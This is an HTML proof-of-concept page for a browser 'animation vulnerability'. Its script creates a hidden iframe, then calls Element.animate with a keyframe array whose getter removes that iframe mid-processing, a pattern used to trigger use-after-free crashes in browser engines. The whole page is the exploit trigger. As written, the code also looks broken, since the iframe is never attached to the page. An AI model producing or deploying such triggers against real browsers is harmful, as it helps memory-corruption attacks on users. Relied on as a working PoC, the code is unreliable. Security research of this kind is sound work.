<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Animation Vulnerability PoC</title>
</head>
<body>
    <h1>PoC for Animation Vulnerability</h1>
    <script>
        function allociframe(){
            var iframe = document.createElement("iframe");
            console.log(iframe);
            iframe.height = 0;
            iframe.width = 0;
            // document.body.appendChild( iframe ); // Uncomment for full iframe rendering
            return iframe;
        }

        iframe = allociframe();
        c = iframe.contentDocument.createElement("div");

        var arr = [];
        arr.__defineGetter__(0, () => {
            console.log("getter called");
            document.body.removeChild(iframe); // Simulate cleanup or context destruction
            return { transform: 'translate3D(0, -300px, 0)' }; // Animation property
        });

        c.animate(arr, { duration: 3000, iterations: Infinity, timeline: null });

    </script>
</body>
</html>
